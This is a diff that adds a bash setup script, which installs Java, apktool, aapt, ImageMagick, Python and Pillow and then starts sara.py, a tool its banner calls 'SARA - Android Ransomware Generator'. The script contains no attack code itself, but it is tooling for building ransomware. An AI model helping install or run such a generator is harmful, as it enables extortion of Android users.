@@ -1,0 +1,87 @@
+#! /usr/bin/bash
+null="> /dev/null 2>&1"
+g="\033[1;32m"
+r="\033[1;31m"
+b="\033[1;34m"
+w="\033[0m"
+
+
+clear
+echo -e $b">"$r" Your computer is updating !!\n\n"
+sleep 2
+apt update -y
+echo -e $r"\n\nYour computer has been updated !!"$w
+sleep 2
+
+
+clear
+echo -e $b">"$r" Your computer is upgrading !!\n\n"$w
+sleep 2
+apt upgrade -y
+echo -e $r"\n\nYour computer has upgraded !!"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Preparing to install dependencies for \n\n"
+echo -e $b">"$w"  SARA - Android Ransomware Generator..."
+sleep 3
+
+clear
+echo -e $b">"$w" Installing package: "$g"default-jdk\n\n"$w
+sleep 2
+sudo apt-get install default-jdk -y
+echo -e $b"\n\n>"$w" Installed package: "$g"default-jdk"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Installing package: "$g"aapt\n\n"$w
+sleep 2
+sudo apt-get install aapt zipalign -y
+echo -e $b"\n\n>"$w" Installed package: "$g"aapt"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Installing package: "$g"apktool\n\n"$w
+sleep 2
+sudo apt-get install apktool -y
+echo -e $b"\n\n>"$w" Installed package: "$g"apktool"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Installing package: "$g"imagemagick\n\n"$w
+sleep 2
+sudo apt-get install imagemagick -y
+echo -e $b"\n\n>"$w" Installed package: "$g"imagemagick"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Installing pacakge: "$g"python3\n\n"$w
+sleep 2
+sudo apt-get install python python2 python3 python3-pip -y
+echo -e $b"\n\n>"$w" Installed package: "$g"python3"$w
+sleep 2
+
+clear
+echo -e $b">"$w" Installing modules: "$g"Pillow\n\n"$w
+sleep 2
+pip3 install Pillow
+echo -e $b"\n\n>"$w" Installed modules: "$g"Pillow"$w
+sleep 2
+
+clear
+echo -e $b"\n\n>"$w"The dependencies have been installed successfully !!"
+sleep 2
+
+clear
+echo -e $b">"$w" Removing unnecessary items... \n\n"$w
+sudo apt autoremove -y
+echo -e $b"\n\n>"$w"The unnecessary items have been removed successfully !!"
+sleep 2
+
+clear
+echo -e $b"SARA"$w" is starting !!"
+sleep 2
+
+python3 sara.py
+
+
